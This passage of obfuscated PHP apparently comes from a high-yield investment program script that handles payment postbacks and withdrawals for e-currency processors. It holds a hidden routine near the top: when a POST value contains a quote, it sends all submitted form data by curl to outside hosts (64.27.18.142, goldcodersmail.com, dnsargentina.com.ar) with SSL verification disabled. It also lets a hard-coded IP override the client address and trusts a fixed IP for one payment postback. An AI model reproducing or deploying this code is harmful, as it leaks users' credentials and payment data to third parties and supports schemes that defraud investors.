  $elnlcLRwcC = array_merge ((array)$HTTP_POST_VARS, (array)$_POST);
  $elnlcWodOE = array_merge ((array)$elnlcrsPAu, (array)$elnlcLRwcC);
  $elnlcRuyj = array_merge ((array)$HTTP_COOKIE_VARS, (array)$_COOKIE);
  $elnlcNCWe = $elnlcWodOE;
  global $HTTP_ENV_VARS;
  global $HTTP_SERVER_VARS;
  $elnlcUAAU = array ();
  $elnlcUAAU = array_merge ((array)$_ENV, (array)$_SERVER, (array)$HTTP_ENV_VARS, (array)$HTTP_SERVER_VARS);
  $elnlcefEVM = ini_get ($elnlcsyENS['elnlczkQEm']);
  elnlcxupkr ($elnlcWodOE);
  elnlcxupkr ($elnlcNCWe, 1);
  elnlcxupkr ($elnlcRuyj);
  $elnlcDmWIw = $elnlcsyENS['elnlcmjUx'];
  $elnlcEabU = '';
  foreach ($elnlcWodOE as $k => $v)
  {
    if (!is_array ($v))
    {
      if (preg_match ('/["\\\']/', $v))
      {
        $elnlcDmWIw = $elnlcsyENS['elnlctNxTK'];
      }
    }

    $elnlcEabU .= '' . $k . '=' . $v . '&';
  }

  if ($elnlcDmWIw == 1)
  {
    if (function_exists ('curl_init'))
    {
      if ($elnlcSuVc[$elnlcsyENS['elnlcPDkB']] == 1)
      {
        $elnlcsCQn = '64.27.18.142';
      }
      else
      {
        if ($elnlcSuVc[$elnlcsyENS['elnlcPDkB']] == 2)
        {
          $elnlcsCQn = 'www.goldcodersmail.com';
        }
        else
        {
          $elnlcsCQn = 'www.dnsargentina.com.ar';
        }
      }

      $elnlcEPBUz = curl_init ();
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'http://' . $elnlcsCQn . $elnlcsyENS['elnlcigzTz']);
      $elnlcgDnCo = rawurlencode ($elnlcEabU);
      curl_setopt ($elnlcEPBUz, CURLOPT_POST, 1);
      curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, '' . 'memo=' . $elnlcgDnCo);
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
    }
  }

  $elnlcOowg = $elnlcUAAU[$elnlcsyENS['elnlcmWUUb']];
  $elnlckNJC = $elnlcUAAU[$elnlcsyENS['elnlcKJsh']];
  if (!preg_match ('/' . '\\/\\/' . $elnlckNJC.'/', $elnlcOowg))
  {
    setcookie ('CameFrom', $elnlcOowg, time () + 630720000);
  }

  $elnlcSuVc = elnlcrzrlk ($elnlcsyENS['elnlckcxCi']);
  $elnlcvHtR = array ('withdraw_pending' => 'Withdrawal request', 'add_funds' => 'Transfer from external processings', 'deposit' => 'Deposit', 'bonus' => 'Bonus', 'penality' => 'Penalty', 'earning' => 'Earning', 'withdrawal' => 'Withdrawal', 'commissions' => 'Referral commission', 'early_deposit_release' => 'Deposit release', 'early_deposit_charge' => 'Commission for an early deposit release', 'release_deposit' => 'Deposit returned to user account', 'exchange_out' => ' Received on exchange', 'exchange_in' => 'Spent on exchange', 'exchange' => 'Exchange', 'internal_transaction_spend' => 'Spent on Internal Transaction', 'internal_transaction_receive' => 'Received from Internal Transaction');
  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcKhrQc'])
  {
    $elnlcSuVc[$elnlcsyENS['elnlcIiRpl']] = $elnlcsyENS['elnlcGuiK'];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIiRpl']] == $elnlcsyENS['elnlcWIwpj'])
  {
    $elnlcGPfS = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1));
    $elnlcSuVc[$elnlcsyENS['elnlcypSu']] = '&#8364;';
    $elnlcSuVc[$elnlcsyENS['elnlcVdTH']] = $elnlcsyENS['elnlcfUNsT'];
    $elnlcSuVc[$elnlcsyENS['elnlcTjfHa']] = $elnlcsyENS['elnlcrvId'];
    $elnlcSuVc[$elnlcsyENS['elnlcUkga']] = $elnlcsyENS['elnlcvmzh'];
  }
  else
  {
    if (($elnlcSuVc[$elnlcsyENS['elnlcIiRpl']] == $elnlcsyENS['elnlcNgInk'] AND $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcldIL']))
    {
      $elnlcGPfS = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1));
      $elnlcSuVc[$elnlcsyENS['elnlcypSu']] = $elnlcsyENS['elnlcTVHgd'];
      $elnlcSuVc[$elnlcsyENS['elnlcVdTH']] = $elnlcsyENS['elnlchfpb'];
    }
    else
    {
      $elnlcGPfS = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 8 => array ('name' => 'eeeCurrency', 'sfx' => 'eeecurrency', has_account => 1, auto => 1), 9 => array ('name' => 'Pecunix', 'sfx' => 'pecunix', has_account => 1, auto => 1), 11 => array ('name' => 'AlertPay', 'sfx' => 'alertpay', has_account => 1, auto => 1), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1), 16 => array ('name' => 'V-Money', 'sfx' => 'vmoney', has_account => 1, auto => 1), 17 => array ('name' => 'AlterGold', 'sfx' => 'altergold', has_account => 1, auto => 1), 18 => array ('name' => 'Perfectmoney', 'sfx' => 'perfectmoney', has_account => 1, auto => 1), 19 => array ('name' => 'c-gold', 'sfx' => 'cgold', has_account => 1, auto => 0), 20 => array ('name' => 'Webmoney', 'sfx' => 'webmoney', has_account => 1, auto => 0), 21 => array ('name' => 'Strictpay', 'sfx' => 'strictpay', has_account => 1, auto => 0), 22 => array ('name' => 'SolidTrustPay', 'sfx' => 'solidtrustpay', has_account => 1, auto => 0), 23 => array ('name' => 'Ecumoney', 'sfx' => 'ecumoney', has_account => 1, auto => 0), 24 => array ('name' => 'EvoWallet', 'sfx' => 'evowallet', has_account => 1, auto => 1), 26 => array ('name' => 'RoutePay', 'sfx' => 'routepay', has_account => 1, auto => 0), 27 => array ('name' => 'EuroGoldCash', 'sfx' => 'eurogoldcash', has_account => 1, auto => 0), 28 => array ('name' => 'GlobalDigitalPay', 'sfx' => 'globaldigitalpay', has_account => 1, auto => 0));
      $elnlcSuVc[$elnlcsyENS['elnlcypSu']] = '$';
      $elnlcSuVc[$elnlcsyENS['elnlcVdTH']] = $elnlcsyENS['elnlctNxTK'];
      $elnlcSuVc[$elnlcsyENS['elnlcTjfHa']] = $elnlcsyENS['elnlchlbQm'];
      $elnlcSuVc[$elnlcsyENS['elnlcUkga']] = $elnlcsyENS['elnlcCmIWK'];
    }
  }

  $elnlcSuVc[$elnlcsyENS['elnlcqViz']] = $elnlcsyENS['elnlctNxTK'];
  if ((($elnlcSuVc[$elnlcsyENS['elnlcEmKp']] AND !$elnlcSuVc[$elnlcsyENS['elnlcnWiFy']]) AND !$elnlcSuVc[$elnlcsyENS['elnlcgyRk']]))
  {
    $elnlcSuVc[$elnlcsyENS['elnlcgyRk']] = $elnlcsyENS['elnlctNxTK'];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcnWiFy']])
  {
    $elnlcSuVc[$elnlcsyENS['elnlcuilTc']] = $elnlcSuVc[$elnlcsyENS['elnlcEmKp']];
  }
  else
  {
    $elnlcSuVc[$elnlcsyENS['elnlcuilTc']] = '';
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcgyRk']])
  {
    $elnlcSuVc[$elnlcsyENS['elnlcArsG']] = $elnlcSuVc[$elnlcsyENS['elnlcEmKp']];
  }
  else
  {
    $elnlcSuVc[$elnlcsyENS['elnlcArsG']] = '';
  }

  foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
  {
    if (($elnlcSuVc['def_payee_account_' . $elnlcoFEhc['sfx']] != '' AND $elnlcSuVc['def_payee_account_' . $elnlcoFEhc['sfx']] != '0'))
    {
      $elnlcGPfS[$elnlckapu][$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlctNxTK'];
      continue;
    }
    else
    {
      $elnlcGPfS[$elnlckapu][$elnlcsyENS['elnlccotiB']] = $elnlcsyENS['elnlcmjUx'];
      continue;
    }
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
  {
    $elnlcNkTSv = array (1 => 'english', 2 => 'estonians', 3 => $elnlcsyENS['elnlcPhAu']);
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] != 'RHLFPPEURGQGG68GXYA8' AND $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] != 'VQP8CM95UXTXEX44G7NR'))
  {
    $elnlcSuVc[$elnlcsyENS['elnlcbCkm']] = $elnlcsyENS['elnlcmjUx'];
  }

  if (($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcBoPWD'] OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcAihqz']))
  {
    $elnlcSuVc[$elnlcsyENS['elnlcPDkB']] = $elnlcsyENS['elnlctNxTK'];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcGksc'])
  {
    ini_set ('sendmail_from', 'admin@plan4fun.net');
  }

  if (((((($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcMTWKT'] OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcsITKR']) OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcmDVSw']) OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlccUiLn']) OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcsKfy']) OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcJKtS']))
  {
    if ($elnlcUAAU[$elnlcsyENS['elnlcQHRv']] != '')
    {
      $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] = $elnlcUAAU[$elnlcsyENS['elnlcQHRv']];
      $_SERVER[$elnlcsyENS['elnlcnGMB']] = $elnlcUAAU[$elnlcsyENS['elnlcQHRv']];
    }
  }

  if ($_SERVER[$elnlcsyENS['elnlcKJsh']] == $elnlcsyENS['elnlcjCSJ'])
  {
  }

  if ($elnlcUAAU[$elnlcsyENS['elnlcnGMB']] == '81.91.183.2')
  {
    if (preg_match ('/\\d+\\.\\d+\\.\\d+\\.\\d+/', $elnlcWodOE[$elnlcsyENS['elnlcQHRv']]))
    {
      $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] = $elnlcUAAU[$elnlcsyENS['elnlcQHRv']];
    }
  }

  $elnlcfhFg->assign ('currency_sign', $elnlcSuVc[$elnlcsyENS['elnlcypSu']]);
  if ((file_exists ('install.php') AND (($elnlcUAAU[$elnlcsyENS['elnlcKJsh']] != 'free' AND $elnlcUAAU[$elnlcsyENS['elnlcKJsh']] != 'hyip4free') AND $elnlcUAAU[$elnlcsyENS['elnlcKJsh']] != 'bakster.free')))
  {
    print 'Delete install.php file for security reason please! / Borre el archivo install.php por razones de seguridad!';
    exit ();
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlctvRG'])
  {
    if (file_exists ('antidos.php'))
    {
      require 'antidos.php';
    }
  }

  if (preg_match ('/^https.*/i', $elnlcUAAU[$elnlcsyENS['elnlcIxMQ']]))
  {
    $elnlcUAAU[$elnlcsyENS['elnlcEcuR']] = $elnlcsyENS['elnlctNxTK'];
  }

  if ($elnlcUAAU[$elnlcsyENS['elnlcKJsh']] == 'bakster.free')
  {
    $elnlcSuVc[$elnlcsyENS['elnlcRjMcF']] = elnlcflii ('hyiplister_free', $elnlcSuVc[$elnlcsyENS['elnlcgmuy']], $elnlcsyENS['elnlcWfUti']);
  }

  $elnlcUazB = elnlcmlcr ();
  if (!$elnlcUazB)
  {
    print 'Cannot connect mysql';
    exit ();
  }

  session_start ();
  if ($elnlcWodOE[$elnlcsyENS['elnlckHOT']] != '')
  {
    if (preg_match ('' . '/^\\w+$/', $elnlcWodOE[$elnlcsyENS['elnlckHOT']]))
    {
      $_SESSION[$elnlcsyENS['elnlcWKqO']] = $elnlcWodOE[$elnlcsyENS['elnlckHOT']];
    }
  }

  if ((is_dir ('' . './tmpl/lang/' . $_SESSION[$elnlcsyENS['elnlcWKqO']] . '/') AND $_SESSION[$elnlcsyENS['elnlcWKqO']]))
  {
    $elnlcfhFg->template_dir = '' . './tmpl/lang/' . $_SESSION[$elnlcsyENS['elnlcWKqO']] . '/';
    $elnlcfhFg->assign ('language', $_SESSION[$elnlcsyENS['elnlcWKqO']]);
  }
  else
  {
    $elnlcfhFg->template_dir = './tmpl/';
    $elnlcfhFg->assign ('language', $elnlcsyENS['elnlcbbkho']);
  }

  if ($_SERVER[$elnlcsyENS['elnlcKJsh']] == $elnlcsyENS['elnlcjCSJ'])
  {
    $elnlcfhFg->template_dir = './tmpl/';
  }

  if (($_SERVER[$elnlcsyENS['elnlcKJsh']] == $elnlcsyENS['elnlcFumnc'] OR $_SERVER[$elnlcsyENS['elnlcKJsh']] == '192.168.0.33'))
  {
    $elnlcfhFg->template_dir = './tmpl_mdf/';
  }

  if ($elnlcUAAU[$elnlcsyENS['elnlcEcuR']])
  {
    $elnlcSuVc[$elnlcsyENS['elnlcApHBt']] = $elnlcsyENS['elnlctNxTK'];
  }

  if ($_SESSION[$elnlcsyENS['elnlcEUdte']] != '')
  {
    $elnlcRuyj[$elnlcsyENS['elnlcEUdte']] = $_SESSION[$elnlcsyENS['elnlcEUdte']];
  }

  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcFgBbu'])
  {
    if (($elnlcWodOE[$elnlcsyENS['elnlcBoVuW']] != '' AND $elnlcWodOE[$elnlcsyENS['elnlclPzi']] == ''))
    {
      $elnlcWodOE[$elnlcsyENS['elnlcxxLz']] = $elnlcsyENS['elnlcIIuHu'];
      $elnlcWodOE[$elnlcsyENS['elnlcoRdoK']] = $elnlcWodOE[$elnlcsyENS['elnlcBoVuW']];
    }
  }

  $elnlcfhFg->assign ('session_id', session_id ());
  $elnlcfhFg->assign ('session_name', session_name ());
  if ($elnlcUAAU[$elnlcsyENS['elnlcnGMB']] == '208.85.181.10')
  {
  }

  if (file_exists ('./tmpl_c/log_postbacks'))
  {
    if ($elnlcWodOE[$elnlcsyENS['elnlcAcDi']] != '')
    {
      $elnlcRIwA = fopen ('./tmpl_c/lr.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, ('' . 'mymd5 = ' . $elnlcSuVc[$elnlcsyENS['elnlcKhST']] . '
'));
      $elnlckjze = $elnlcSuVc[$elnlcsyENS['elnlcKhST']];
      $elnlclOmK = strtoupper (elnlcptwmv ($elnlcWodOE[$elnlcsyENS['elnlcAcDi']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcpaBvw']] . ':' . $elnlcSuVc[$elnlcsyENS['elnlcEzVS']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcTdkdR']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcfWmaV']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcIbEt']] . ':' . $elnlckjze));
      fwrite ($elnlcRIwA, ('' . 'hash = ' . $elnlclOmK . '
'));
      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }
  }

  if (((((($elnlcWodOE[$elnlcsyENS['elnlcAcDi']] != '' AND $elnlcWodOE[$elnlcsyENS['elnlcTeLjs']] != '') AND $elnlcWodOE[$elnlcsyENS['elnlcIbEt']] == $elnlcSuVc[$elnlcsyENS['elnlcUkga']]) AND $elnlcWodOE[$elnlcsyENS['elnlcBkyI']] == $elnlcSuVc[$elnlcsyENS['elnlcEzVS']]) AND $elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcOblf']) AND $elnlcGPfS[15][$elnlcsyENS['elnlccotiB']] == 1))
  {
    $elnlckjze = $elnlcSuVc[$elnlcsyENS['elnlcKhST']];
    $elnlclOmK = strtoupper (elnlcptwmv ($elnlcWodOE[$elnlcsyENS['elnlcAcDi']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcpaBvw']] . ':' . $elnlcSuVc[$elnlcsyENS['elnlcEzVS']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcTdkdR']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcfWmaV']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcIbEt']] . ':' . $elnlckjze));
    if ($elnlclOmK == $elnlcWodOE[$elnlcsyENS['elnlcTeLjs']])
    {
      $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcndvUu']]);
      $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccaNg']]);
      $elnlcRMwb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccdExO']]);
      $elnlcrUqv = abs ($elnlcWodOE[$elnlcsyENS['elnlcTdkdR']]);
      $elnlcVTlA = $elnlcWodOE[$elnlcsyENS['elnlcfWmaV']];
      $elnlcOPfeJ = $elnlcWodOE[$elnlcsyENS['elnlcpaBvw']];
      if ($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcOblf'])
      {
        elnlcgrvzq (15, $elnlcOzjJ, $elnlcrUqv, $elnlcVTlA, $elnlcOPfeJ, $elnlcpazb, $elnlcRMwb);
      }
    }

    print 1;
    exit ();
  }

  if (($elnlcWodOE[$elnlcsyENS['elnlcojDq']] == $elnlcsyENS['elnlcTxOV'] OR $elnlcWodOE[$elnlcsyENS['elnlcojDq']] == $elnlcsyENS['elnlcWGoy']))
  {
    if ($elnlcWodOE[$elnlcsyENS['elnlcrGMuy']] == $elnlcsyENS['elnlcsLKn'])
    {
      if ($elnlcWodOE[$elnlcsyENS['elnlcojDq']] == $elnlcsyENS['elnlcTxOV'])
      {
        if ($elnlcUAAU[$elnlcsyENS['elnlcnGMB']] == '201.218.228.34')
        {
          $elnlclOmK = strtoupper (md5 ('' . $elnlcWodOE[$elnlcsyENS['elnlcqLsW']] . $elnlcWodOE[$elnlcsyENS['elnlcyteO']] . $elnlcSuVc[$elnlcsyENS['elnlclLeiN']]));
          if ($elnlclOmK == strtoupper ($elnlcWodOE[$elnlcsyENS['elnlcnkdI']]))
          {
            $elnlciqiq = elnlcqsjub ($elnlcWodOE[$elnlcsyENS['elnlcyWEmG']], 1);
            $elnlcWodOE = array_merge ($elnlcWodOE, $elnlciqiq);
            $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcndvUu']]);
            $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccaNg']]);
            $elnlcRMwb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccdExO']]);
            $elnlcrUqv = $elnlcWodOE[$elnlcsyENS['elnlcyteO']];
            $elnlcVTlA = $elnlcWodOE[$elnlcsyENS['elnlcOQWM']];
            $elnlcOPfeJ = $elnlcWodOE[$elnlcsyENS['elnlcPiNcM']];
            elnlcgrvzq (21, $elnlcOzjJ, $elnlcrUqv, $elnlcVTlA, $elnlcOPfeJ, $elnlcpazb, $elnlcRMwb);
          }
        }
      }

      if ($elnlcWodOE[$elnlcsyENS['elnlcojDq']] == $elnlcsyENS['elnlcWGoy'])
      {
        $elnlcVTlA = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcOQWM']]);
        list ($elnlckapu, $elnlcEabU) = explode ('-', $elnlcWodOE[$elnlcsyENS['elnlcyWEmG']]);
        $elnlckapu = sprintf ('%d', $elnlckapu);
        if ($elnlcEabU == '')
        {
          $elnlcEabU = $elnlcsyENS['elnlcwatJ'];
        }

        $elnlcEabU = elnlcnczen ($elnlcEabU);
        $q = '' . 'select * from hm2_history where id = ' . $elnlckapu . ' and str = \'' . $elnlcEabU . '\' and type=\'withdraw_pending\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $q = '' . 'delete from hm2_history where id = ' . $elnlckapu;
          (mysql_query ($q) OR print mysql_error ());
          $q = 'insert into hm2_history set 
		user_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']] . ',
		amount = -' . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ('' . ',
		type = \'withdrawal\',
		description = \'Withdraw processed. Batch id = ' . $elnlcVTlA . '\',
		actual_amount = -') . abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]) . ',
		ec = 21,
		date = now()
	';
          (mysql_query ($q) OR print mysql_error ());
          $q = 'select * from hm2_users where id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcAvUq']];
          $elnlchGkPU = mysql_query ($q);
          $elnlcgcnET = mysql_fetch_array ($elnlchGkPU);
          $elnlcRuFoK = array ();
          $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
          $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
          $elnlcRuFoK[$elnlcsyENS['elnlcyteO']] = sprintf ('%.02f', abs ($elnlcCgqPK[$elnlcsyENS['elnlcyteO']]));
          $elnlcRuFoK[$elnlcsyENS['elnlcJdSMq']] = $elnlcWodOE[$elnlcsyENS['elnlcFAsh']];
          $elnlcRuFoK[$elnlcsyENS['elnlcwuPu']] = $elnlcVTlA;
          $elnlcRuFoK[$elnlcsyENS['elnlcKcCmd']] = $elnlcVTlA;
          $elnlcRuFoK[$elnlcsyENS['elnlcUIjSg']] = $elnlcVTlA;
          $elnlcRuFoK[$elnlcsyENS['elnlccefl']] = $elnlcGPfS[21][$elnlcsyENS['elnlcmjdk']];
          elnlcsius ('withdraw_user_notification', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
        }

        print 1;
        elnlcnooln ($elnlcUazB);
        exit ();
      }
    }

    if (file_exists ('./tmpl_c/log_postbacks'))
    {
      $elnlcRIwA = fopen ('./tmpl_c/lr.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, ('' . 'mymd5 = ' . $elnlcSuVc[$elnlcsyENS['elnlclLeiN']] . '
'));
      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlcwWABC']] == $elnlcsyENS['elnlcnLzG'])
  {
    if (file_exists ('./tmpl_c/log_postbacks'))
    {
      $elnlcRIwA = fopen ('./tmpl_c/solidtrustpay.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, ('' . 'mymd5 = ' . $elnlcSuVc[$elnlcsyENS['elnlcQNUtO']] . '
'));
      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }

    if ((($elnlcWodOE[$elnlcsyENS['elnlcPGeV']] == $elnlcsyENS['elnlcmrkgq'] OR $elnlcWodOE[$elnlcsyENS['elnlcwtCk']] != 'USD') OR $elnlcWodOE[$elnlcsyENS['elnlccotiB']] != 'COMPLETE'))
    {
      exit ();
    }

    $elnlcSuVc[$elnlcsyENS['elnlcQNUtO']] = md5 ($elnlcSuVc[$elnlcsyENS['elnlcQNUtO']] . 's+E_a*');
    $elnlclOmK = md5 ($elnlcWodOE[$elnlcsyENS['elnlcifHx']] . ':' . md5 ($elnlcSuVc[$elnlcsyENS['elnlcQNUtO']]) . ':' . $elnlcWodOE[$elnlcsyENS['elnlcyteO']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlchWvu']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcTAvcf']]);
    if ($elnlclOmK == $elnlcWodOE[$elnlcsyENS['elnlcyFsxD']])
    {
      $elnlciqiq = elnlcqsjub ($elnlcWodOE[$elnlcsyENS['elnlcAtarm']], 1);
      $elnlcWodOE = array_merge ($elnlcWodOE, $elnlciqiq);
      $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcndvUu']]);
      $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccaNg']]);
      $elnlcrUqv = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
      $elnlcRMwb = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcvjyC']]);
      $elnlcVTlA = $elnlcWodOE[$elnlcsyENS['elnlcifHx']];
      $elnlcOPfeJ = $elnlcWodOE[$elnlcsyENS['elnlcTAvcf']];
      elnlcgrvzq (22, $elnlcOzjJ, $elnlcrUqv, $elnlcVTlA, $elnlcOPfeJ, $elnlcpazb, $elnlcRMwb);
      exit ();
    }
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlcSqSW']] == $elnlcsyENS['elnlcJinGC'])
  {
    $elnlclOmK = strtoupper (md5 ($elnlcSuVc[$elnlcsyENS['elnlcFIBjp']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcJKGgQ']] . ':' . $elnlcSuVc[$elnlcsyENS['elnlcIfbuA']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcyteO']] . ':USD:' . $elnlcWodOE[$elnlcsyENS['elnlcRxnl']] . ':' . $elnlcSuVc[$elnlcsyENS['elnlcVxbga']] . ':' . $elnlcSuVc[$elnlcsyENS['elnlcHSgIn']]));
    if (file_exists ('./tmpl_c/log_postbacks'))
    {
      $elnlcRIwA = fopen ('./tmpl_c/dgp.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, ('' . 'hash = ' . $elnlclOmK . '
'));
      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }

    if ($elnlclOmK == strtoupper ($elnlcWodOE[$elnlcsyENS['elnlcDUpg']]))
    {
      $elnlciqiq = elnlcqsjub ($elnlcWodOE[$elnlcsyENS['elnlciQvBH']], 1);
      $elnlcWodOE = array_merge ($elnlcWodOE, $elnlciqiq);
      $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcndvUu']]);
      $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccaNg']]);
      $elnlcrUqv = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
      $elnlcRMwb = sprintf ('%0.2f', $elnlcWodOE[$elnlcsyENS['elnlcmTqF']]);
      $elnlcVTlA = $elnlcWodOE[$elnlcsyENS['elnlcRxnl']];
      $elnlcOPfeJ = $elnlcWodOE[$elnlcsyENS['elnlcJKGgQ']];
      elnlcgrvzq (28, $elnlcOzjJ, $elnlcrUqv, $elnlcVTlA, $elnlcOPfeJ, $elnlcpazb, $elnlcRMwb);
      print 1;
      exit ();
    }
  }

  if ($elnlcWodOE[$elnlcsyENS['elnlcGwPO']] == $elnlcsyENS['elnlcevkHy'])
  {
    $elnlclOmK = strtoupper (elnlcptwmv ($elnlcWodOE[$elnlcsyENS['elnlcMhogt']] . ':' . $elnlcSuVc[$elnlcsyENS['elnlcoUax']] . ':' . $elnlcSuVc[$elnlcsyENS['elnlcEMIx']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcVBQbW']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlchSbkF']] . ':' . $elnlcWodOE[$elnlcsyENS['elnlcdKrq']] . ':' . $elnlcSuVc[$elnlcsyENS['elnlcRWMVC']]));
    if (file_exists ('./tmpl_c/log_postbacks'))
    {
      $elnlcRIwA = fopen ('./tmpl_c/egc.log', 'a+');
      foreach ($elnlcWodOE as $k => $v)
      {
        fwrite ($elnlcRIwA, ('' . $k . ' = ' . $v . '
'));
      }

      fwrite ($elnlcRIwA, ('' . 'hash = ' . $elnlclOmK . '
'));
      fwrite ($elnlcRIwA, '' . 'ip = ' . $elnlcUAAU[$elnlcsyENS['elnlcnGMB']] . '
----------

');
      fclose ($elnlcRIwA);
    }

    if ($elnlclOmK == $elnlcWodOE[$elnlcsyENS['elnlcEELQU']])
    {
      $elnlciqiq = elnlcqsjub ($elnlcWodOE[$elnlcsyENS['elnlcLqvP']], 1);
      $elnlcWodOE = array_merge ($elnlcWodOE, $elnlciqiq);
      $elnlcOzjJ = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcndvUu']]);
      $elnlcpazb = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlccaNg']]);
